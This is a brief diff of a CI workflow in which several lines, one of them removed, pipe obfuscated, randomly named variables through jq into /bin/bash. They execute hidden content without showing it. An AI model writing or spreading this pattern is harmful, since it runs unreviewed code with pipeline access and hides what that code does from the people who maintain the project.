@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$vmecg75686" | jq -r .ifub399 | /bin/bash
           echo $havq700 | jq -r .jocuo0462 | /bin/bash
           echo $vp33766 | jq -r .odact2646 | /bin/bash
-          echo $q8195 | jq -r .tamaf12 | /bin/bash
           echo $c9790 | jq -r .okr9432 | /bin/bash
           printf '%s' "$gbt81767" | jq -r .kvj9 | /bin/bash
           echo $is410 | jq -r .sna3 | /bin/bash
